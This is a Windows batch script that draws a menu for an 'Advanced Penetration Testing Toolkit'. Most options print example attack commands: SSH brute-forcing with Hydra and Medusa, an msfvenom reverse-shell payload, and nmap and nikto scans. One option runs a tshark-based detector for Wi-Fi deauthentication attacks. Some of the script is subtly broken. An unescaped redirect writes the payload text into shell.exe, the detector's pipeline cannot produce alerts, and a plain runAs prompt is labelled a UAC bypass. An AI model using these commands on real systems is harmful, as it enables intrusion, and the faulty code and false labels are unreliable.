@echo off
mode 80, 30
title Advanced Penetration Testing Toolkit
chcp 65001 >nul

:start
cls
echo.
echo.
echo [34m┌───────────────────────────────────────────────────────────────────┐[0m
echo [34m│ [96m██████╗ ███████╗███╗   ██╗████████╗███████╗██████╗ ███████╗ [34m│[0m
echo [34m│ [96m██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝ [34m│[0m
echo [34m│ [96m██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝█████╗    [34m│[0m
echo [34m│ [96m██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔═══╝ ██╔══╝    [34m│[0m
echo [34m│ [96m██║     ███████╗██║ ╚████║   ██║   ███████╗██║     ███████╗ [34m│[0m
echo [34m│ [96m╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ [34m│[0m
echo [34m└───────────────────────────────────────────────────────────────────┘[0m
echo.
echo [96m       Select an Option Below to Explore Tools and Techniques[0m
echo.
ping localhost -n 1 >nul
echo     [90;1m#═╦═══════»[0m  [92m[Bruteforce Tools][0m     [95m[1][0m
ping localhost -n 1 >nul
echo       [90;1m╚═╦══════»[0m  [92m[Privilege Escalation][0m[95m[2][0m
ping localhost -n 1 >nul
echo         [90;1m╚═╦═════»[0m  [92m[Payload Generator][0m    [95m[3][0m
ping localhost -n 1 >nul
echo           [90;1m╚═╦════»[0m  [92m[Scanning & Recon][0m     [95m[4][0m
ping localhost -n 1 >nul
echo             [90;1m╚═╦═══»[0m  [92m[PowerShell Scripts][0m  [95m[5][0m
ping localhost -n 1 >nul
echo               [90;1m╚═╦═»[0m  [92m[Windows Tools][0m       [95m[6][0m
ping localhost -n 1 >nul
echo                 [90;1m╚═╦»[0m  [92m[Wi-Fi Attack Detection][0m[95m[7][0m
ping localhost -n 1 >nul
echo                   [90;1m╚═»[0m  [92m[Exit][0m               [95m[8][0m
echo|set /p=".                    [90;1m╚══>[0m"
choice /c 12345678 /n >nul
set choice=%errorlevel%

if %choice%==1 goto brute_force
if %choice%==2 goto privilege_escalation
if %choice%==3 goto payload_gen
if %choice%==4 goto scanning
if %choice%==5 goto powershell_scripts
if %choice%==6 goto windows_tools
if %choice%==7 goto wifi_detection
if %choice%==8 exit

:wifi_detection
cls
echo ============================================================
echo                Wi-Fi Attack Detection with Logging
echo ============================================================
echo [96mThis tool detects Wi-Fi deauthentication attacks and logs them.[0m
echo [92mRequirements:[0m
echo  - Wireshark and TShark installed
echo  - Wireless adapter supporting monitor mode
echo  - Run the tool as Administrator
echo.
echo [93m[+] How It Works[0m:
echo  - Monitors network traffic for deauthentication packets
echo  - Logs detected attacks to 'wifi_attack_log.txt'
echo  - Displays real-time alerts for suspicious activity
echo.

:: Log file setup
set logfile=wifi_attack_log.txt
echo Starting Wi-Fi monitoring... > %logfile%

powershell -Command ^
"if (!(Test-Path tshark.exe)) { Write-Host 'TShark not found. Please install Wireshark.'; exit } ^
Write-Host 'Monitoring Wi-Fi traffic for deauthentication attacks...'; ^
Start-Process -NoNewWindow -Wait -FilePath 'tshark.exe' -ArgumentList '-i 1 -Y wlan.fc.type_subtype==12 -T fields -e wlan.sa -e wlan.da -e frame.time' | ForEach-Object { ^
  Add-Content -Path '%logfile%' -Value $_; ^
  Write-Host 'ALERT! Deauthentication packet detected: ' $_ -ForegroundColor Red }"

pause
goto start

:brute_force
cls
echo ============================================================
echo                     Brute Force Tools
echo ============================================================
echo Example commands for brute-forcing services like SSH:
echo [93m[+] Hydra[0m: hydra -l admin -P passwords.txt ssh://target_ip
echo [93m[+] Medusa[0m: medusa -h target_ip -U users.txt -P passwords.txt -M ssh
pause
goto start

:privilege_escalation
cls
echo ============================================================
echo                Privilege Escalation Techniques
echo ============================================================
echo Example: Simulating UAC Bypass
echo Command: powershell -Command "Start-Process cmd -Verb runAs"
pause
goto start

:payload_gen
cls
echo ============================================================
echo                   Payload Generator
echo ============================================================
echo [92mExample Commands:[0m
echo  - Generate a Windows reverse shell:
echo    msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > shell.exe
pause
goto start

:scanning
cls
echo ============================================================
echo            Scanning and Reconnaissance Tools
echo ============================================================
echo [92mExample Commands:[0m
echo  - Network Scan: nmap -sC -sV -oN scan.txt target_ip
echo  - Web Scan: nikto -h http://target_ip
pause
goto start

:powershell_scripts
cls
echo ============================================================
echo                Automated PowerShell Scripts
echo ============================================================
echo Example: List active network connections
echo Command: powershell -Command "Get-NetTCPConnection | Sort-Object State"
pause
goto start

:windows_tools
cls
echo ============================================================
echo                   Windows Tools
echo ============================================================
echo Example Commands:
echo  - List running processes: tasklist
echo  - Show network connections: netstat -an
pause
goto start
